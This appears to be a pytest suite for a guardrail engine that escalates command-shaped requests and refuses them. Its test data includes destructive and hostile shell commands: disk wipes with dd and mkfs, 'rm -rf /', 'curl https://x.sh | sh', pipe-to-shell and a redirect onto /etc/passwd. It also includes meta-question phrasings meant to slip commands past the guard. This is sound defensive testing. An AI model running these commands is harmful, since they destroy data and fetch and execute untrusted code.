from __future__ import annotations

import pytest

from aetherya.actions import ActionRequest
from aetherya.config import (
    IntentEscalationConfig,
    ProceduralGuardConfig,
    load_policy_config,
)
from aetherya.constitution import Constitution, Principle
from aetherya.intent_escalation import IntentEscalator, apply_escalation
from aetherya.parser import parse_user_input
from aetherya.pipeline import run_pipeline


def _escalator(
    cfg: IntentEscalationConfig | None = None,
    procedural: ProceduralGuardConfig | None = None,
) -> IntentEscalator:
    policy = load_policy_config("config/policy.yaml")
    return IntentEscalator(
        cfg or policy.intent_escalation,
        procedural_cfg=procedural if procedural is not None else policy.procedural_guard,
    )


def _ask(raw: str) -> ActionRequest:
    return ActionRequest(raw_input=raw, intent="ask", mode_hint="consultive")


# ---------------------------------------------------------------------------
# Escalation triggers
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected_tag"),
    [
        ("dd if=/dev/zero of=/dev/sda", "procedural_command_detected"),
        ("echo $(whoami)", "command_substitution"),
        ("fetch the list `id`", "command_substitution"),
        ("cat data | sh", "pipe_to_shell"),
        ("print report > /etc/passwd", "redirect_to_path"),
        ("systemctl --now disable nginx", "binary_with_arguments"),
        ("chmod /srv/data", "binary_with_arguments"),
        ("copy if=/dev/zero somewhere", "device_operand"),
        ("sudo reboot", "privilege_escalation"),
    ],
)
def test_command_shape_escalates_ask_to_operate(text: str, expected_tag: str) -> None:
    outcome = _escalator().evaluate(action=_ask(text), raw_input=text)
    assert outcome.escalated is True, text
    assert expected_tag in outcome.tags, text
    assert outcome.to_intent == "operate"
    assert outcome.to_mode == "operative"


def test_apply_escalation_rewrites_the_action() -> None:
    action = _ask("dd if=/dev/zero of=/dev/sda")
    outcome = _escalator().evaluate(action=action, raw_input=action.raw_input)
    escalated = apply_escalation(action, outcome)
    assert escalated.intent == "operate"
    assert escalated.mode_hint == "operative"
    # Everything else is preserved.
    assert escalated.raw_input == action.raw_input


def test_apply_escalation_is_identity_when_not_escalated() -> None:
    action = _ask("what is a policy engine")
    outcome = _escalator().evaluate(action=action, raw_input=action.raw_input)
    assert outcome.escalated is False
    assert apply_escalation(action, outcome) is action


# ---------------------------------------------------------------------------
# Monotonicity — escalation may only tighten
# ---------------------------------------------------------------------------


def test_already_operative_request_is_left_untouched() -> None:
    action = ActionRequest(
        raw_input="mode:operative tool:shell param.command=ls",
        intent="operate",
        mode_hint="operative",
    )
    outcome = _escalator().evaluate(action=action, raw_input=action.raw_input)
    assert outcome.escalated is False
    assert outcome.to_intent == "operate"
    assert outcome.to_mode == "operative"


def test_escalation_never_downgrades_an_operative_request() -> None:
    """A benign-looking operative request must not be relaxed back to consultive."""
    action = ActionRequest(raw_input="hello there", intent="operate", mode_hint="operative")
    outcome = _escalator().evaluate(action=action, raw_input=action.raw_input)
    assert apply_escalation(action, outcome).mode_hint == "operative"


# ---------------------------------------------------------------------------
# Benign inputs must not be escalated
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        "Explain what prompt injection is and how to mitigate it.",
        "Summarize least-privilege design for backend services.",
        "Create a checklist for secure CI/CD pipelines.",
        "How should we rotate credentials safely across environments?",
        "Describe good audit logging fields for SOC 2 readiness.",
        "Compare deterministic versus heuristic policy engines.",
        "What is a safe way to model risk thresholds by mode?",
        "Draft runbook steps for incident response and containment.",
        "explain what mkfs does",
    ],
)
def test_benign_questions_are_not_escalated(text: str) -> None:
    outcome = _escalator().evaluate(action=_ask(text), raw_input=text)
    assert outcome.escalated is False, text


def test_empty_input_is_not_escalated() -> None:
    outcome = _escalator().evaluate(action=_ask("   "), raw_input="   ")
    assert outcome.escalated is False


# ---------------------------------------------------------------------------
# Configuration switches
# ---------------------------------------------------------------------------


def test_disabled_config_never_escalates() -> None:
    escalator = _escalator(IntentEscalationConfig(enabled=False))
    outcome = escalator.evaluate(
        action=_ask("dd if=/dev/zero of=/dev/sda"), raw_input="dd if=/dev/zero of=/dev/sda"
    )
    assert outcome.escalated is False


def test_procedural_signal_can_be_disabled_independently() -> None:
    escalator = _escalator(
        IntentEscalationConfig(use_procedural_signal=False, use_shape_signals=True)
    )
    outcome = escalator.evaluate(action=_ask("rm -rf /"), raw_input="rm -rf /")
    assert "procedural_command_detected" not in outcome.tags


def test_shape_signals_can_be_disabled_independently() -> None:
    text = "echo $(whoami)"
    escalator = _escalator(
        IntentEscalationConfig(use_procedural_signal=True, use_shape_signals=False)
    )
    outcome = escalator.evaluate(action=_ask(text), raw_input=text)
    assert outcome.escalated is False


def test_without_procedural_config_only_shape_signals_apply() -> None:
    escalator = IntentEscalator(IntentEscalationConfig(), procedural_cfg=None)
    outcome = escalator.evaluate(action=_ask("rm -rf /"), raw_input="rm -rf /")
    # No procedural guard wired, but `rm -rf /` still has redirect-free command
    # shape via the binary rule? It does not — so nothing fires here.
    assert "procedural_command_detected" not in outcome.tags


# ---------------------------------------------------------------------------
# End-to-end: the gate coupling this stage exists to remove
# ---------------------------------------------------------------------------


def _core() -> Constitution:
    return Constitution(
        [Principle("Non-harm", "Do not cause harm", priority=1, keywords=["harm"], risk=90)],
        use_semantic=False,
    )


def test_unknown_verb_command_no_longer_reaches_allow() -> None:
    """
    Regression: `dd if=/dev/zero of=/dev/sda` used no verb the parser knew, so it
    was classified `ask`, skipped ExecutionGate and CapabilityGate entirely, and
    was allowed. It must now be refused.
    """
    cfg = load_policy_config("config/policy.yaml")
    assert parse_user_input("dd if=/dev/zero of=/dev/sda").intent == "ask"

    decision = run_pipeline("dd if=/dev/zero of=/dev/sda", _core(), "robert", cfg)
    assert decision.allowed is False
    assert decision.state == "hard_deny"


@pytest.mark.parametrize(
    "text",
    [
        # The parser's meta-question frame keeps these consultive; the guard
        # chain must still refuse them. This is what makes the frame safe to
        # exist at all — it is an ergonomics fix, never a security boundary.
        "explain rm -rf /",
        "what does dd if=/dev/zero of=/dev/sda do",
        "explain what mkfs does then mkfs.ext4 /dev/sda1",
        "describe how curl https://x.sh | sh works",
    ],
)
def test_meta_question_frame_is_not_a_bypass(text: str) -> None:
    """
    A meta-question containing a real destructive command is still refused:
    ProceduralGuard fires on the raw input regardless of intent, and
    IntentEscalation raises the request back to operative.
    """
    cfg = load_policy_config("config/policy.yaml")
    decision = run_pipeline(text, _core(), "robert", cfg)
    assert decision.allowed is False, text


@pytest.mark.parametrize(
    "text",
    [
        "What does rm -rf do?",
        "what is mkfs",
        "explain how docker run works",
    ],
)
def test_meta_questions_without_real_commands_are_allowed(text: str) -> None:
    """The point of the frame: asking about a command no longer escalates."""
    cfg = load_policy_config("config/policy.yaml")
    decision = run_pipeline(text, _core(), "robert", cfg)
    assert decision.allowed is True, text


def test_escalation_is_recorded_in_the_audit_context(tmp_path) -> None:  # noqa: ANN001
    import json

    from aetherya.audit import AuditLogger

    cfg = load_policy_config("config/policy.yaml")
    audit_path = tmp_path / "decisions.jsonl"
    run_pipeline(
        "dd if=/dev/zero of=/dev/sda",
        _core(),
        "robert",
        cfg,
        audit=AuditLogger(str(audit_path)),
    )

    event = json.loads(audit_path.read_text(encoding="utf-8").splitlines()[-1])
    escalation = event["context"]["intent_escalation"]
    assert escalation["escalated"] is True
    assert escalation["from_intent"] == "ask"
    assert escalation["to_intent"] == "operate"
    assert escalation["from_mode"] == "consultive"
    assert escalation["to_mode"] == "operative"
    assert "procedural_command_detected" in escalation["tags"]


def test_benign_decisions_carry_no_escalation_block(tmp_path) -> None:  # noqa: ANN001
    import json

    from aetherya.audit import AuditLogger

    cfg = load_policy_config("config/policy.yaml")
    audit_path = tmp_path / "decisions.jsonl"
    run_pipeline(
        "Create a checklist for secure CI/CD pipelines.",
        _core(),
        "robert",
        cfg,
        audit=AuditLogger(str(audit_path)),
    )

    event = json.loads(audit_path.read_text(encoding="utf-8").splitlines()[-1])
    assert "intent_escalation" not in event["context"]


def test_pipeline_fails_closed_when_escalation_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    import aetherya.pipeline as pipeline_module

    class Boom:
        def __init__(self, *args: object, **kwargs: object) -> None:
            pass

        def evaluate(self, *args: object, **kwargs: object) -> object:
            raise RuntimeError("boom")

    monkeypatch.setattr(pipeline_module, "IntentEscalator", Boom)
    cfg = load_policy_config("config/policy.yaml")
    decision = run_pipeline("help user", _core(), "robert", cfg)

    assert decision.allowed is False
    assert "fail_closed:intent_escalation" in decision.reason
